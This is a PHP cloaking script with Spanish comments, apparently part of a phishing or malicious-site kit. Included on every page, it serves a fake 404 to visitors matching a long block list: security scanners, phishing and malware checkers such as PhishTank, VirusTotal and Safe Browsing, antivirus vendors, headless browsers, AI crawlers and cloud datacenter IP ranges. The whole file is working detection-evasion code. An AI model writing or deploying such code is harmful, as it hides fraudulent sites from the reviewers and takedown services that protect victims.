<?php
/* ═══════════════════════════════════════════════════════════════
   _guard.php — Cloaking PHP (segunda capa, después de .htaccess)
   Incluir al inicio de TODAS las páginas (excepto bot.php).
   Uso:  include('_guard.php');
   ═══════════════════════════════════════════════════════════════ */

(function () {
    $ua  = $_SERVER['HTTP_USER_AGENT']  ?? '';
    $ip  = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
    if (strpos($ip, ',') !== false) $ip = trim(explode(',', $ip)[0]);
    $ref = $_SERVER['HTTP_REFERER']    ?? '';
    $acc = $_SERVER['HTTP_ACCEPT']     ?? '';
    $lang= $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';

    $block = function () {
        http_response_code(404);
        if (file_exists(__DIR__ . '/blocked.html')) {
            readfile(__DIR__ . '/blocked.html');
        } else {
            echo '<h1>404 Not Found</h1>';
        }
        exit;
    };

    // 1. UA vacío, demasiado corto o sospechoso
    if ($ua === '' || strlen($ua) < 20) $block();

    // 2. UA blacklist (regex unificado)
    $bl = '/(bot|crawler|spider|scraper|nessus|acunetix|nikto|nmap|sqlmap|openvas|burp|zap|w3af|wpscan|wfuzz|nuclei|qualys|rapid7|tenable|detectify|netsparker|phishtank|netcraft|urlscan|virustotal|safebrowsing|trendmicro|paloalto|fortinet|symantec|mcafee|sophos|eset|kaspersky|bitdefender|avast|f-secure|webroot|malwarebytes|talos|zscaler|forcepoint|barracuda|proofpoint|mimecast|cyren|sucuri|wordfence|imunify|headless|phantomjs|selenium|puppeteer|playwright|cypress|webdriver|curl\/|wget|libwww|lwp|mechanize|scrapy|python-requests|python-urllib|python\/|aiohttp|httpx|go-http-client|java\/|okhttp|apache-httpclient|node-fetch|guzzle|ahrefs|semrush|mj12|dotbot|rogerbot|screaming|sistrix|majestic|gptbot|chatgpt|openai|anthropic|claude|ccbot|perplexity|google-extended|bard|gemini|llamabot|imagesift|diffbot|amazonbot|applebot)/i';
    if (preg_match($bl, $ua)) $block();

    // 3. Falta Accept o Accept-Language (humano normal sí los manda)
    if ($acc === '' || $lang === '') $block();

    // 4. Referer de scanners
    if ($ref && preg_match('/(virustotal|urlscan|phishtank|netcraft|safebrowsing|cisco|talos|sucuri|wordfence|cloudflare\.com\/cdn-cgi)/i', $ref)) $block();

    // 5. IPs de datacenters/scanners (lista curada)
    $cidrs = [
        // AWS
        '3.0.0.0/8','13.32.0.0/15','15.230.0.0/15','18.32.0.0/11','34.192.0.0/12',
        '35.71.64.0/18','52.0.0.0/8','54.144.0.0/12',
        // Google Cloud / Crawlers
        '34.64.0.0/10','35.184.0.0/13','35.192.0.0/14','64.233.160.0/19',
        '66.102.0.0/20','66.249.64.0/19','72.14.192.0/18','74.125.0.0/16',
        '108.59.80.0/20','108.170.192.0/18','173.194.0.0/16','209.85.128.0/17',
        '216.58.192.0/19','216.239.32.0/19',
        // Microsoft Azure / Bing
        '13.64.0.0/11','20.33.0.0/16','40.74.0.0/15','40.76.0.0/14',
        '40.80.0.0/12','40.96.0.0/12','40.112.0.0/13','52.96.0.0/12',
        '52.112.0.0/14','65.52.0.0/14','104.40.0.0/13','157.55.0.0/16',
        '207.46.0.0/16',
        // DigitalOcean
        '45.55.0.0/16','46.101.0.0/16','67.205.128.0/18','104.131.0.0/16',
        '104.236.0.0/16','107.170.0.0/16','128.199.0.0/16','138.197.0.0/16',
        '138.68.0.0/16','139.59.0.0/16','142.93.0.0/16','157.230.0.0/16',
        '157.245.0.0/16','159.65.0.0/16','159.89.0.0/16','161.35.0.0/16',
        '162.243.0.0/16','165.227.0.0/16','167.71.0.0/16','167.99.0.0/16',
        '178.62.0.0/16','188.166.0.0/16',
        // OVH / Hetzner
        '5.39.0.0/17','5.135.0.0/16','37.59.0.0/16','46.4.0.0/16',
        '49.12.0.0/16','78.46.0.0/15','85.10.192.0/18','88.198.0.0/16',
        '94.130.0.0/16','116.202.0.0/15','135.181.0.0/16','136.243.0.0/16',
        '138.201.0.0/16','144.76.0.0/16','148.251.0.0/16','159.69.0.0/16',
        '162.55.0.0/16','167.235.0.0/16','168.119.0.0/16','188.40.0.0/16',
        '195.201.0.0/16',
        // Linode
        '23.92.16.0/20','45.33.0.0/17','45.56.64.0/18','45.79.0.0/16',
        '50.116.0.0/18','69.164.192.0/18','96.126.96.0/19','139.144.0.0/16',
        '143.42.0.0/16','143.198.0.0/16','172.104.0.0/15','172.232.0.0/15',
        // Vultr
        '45.32.0.0/16','45.63.0.0/16','45.76.0.0/16','45.77.0.0/16',
        '108.61.0.0/16','149.28.0.0/16','149.248.0.0/16','155.138.128.0/17',
        '207.246.64.0/18',
    ];

    $in_cidr = function ($ip, $cidr) {
        if (strpos($ip, ':') !== false) return false; // IPv6: skip
        list($subnet, $mask) = array_pad(explode('/', $cidr), 2, 32);
        $mask = (int)$mask;
        if ($mask < 0 || $mask > 32) return false;
        $ip_long = ip2long($ip);
        $sub_long = ip2long($subnet);
        if ($ip_long === false || $sub_long === false) return false;
        $mask_long = $mask === 0 ? 0 : (-1 << (32 - $mask));
        return ($ip_long & $mask_long) === ($sub_long & $mask_long);
    };

    foreach ($cidrs as $cidr) {
        if ($in_cidr($ip, $cidr)) $block();
    }
})();
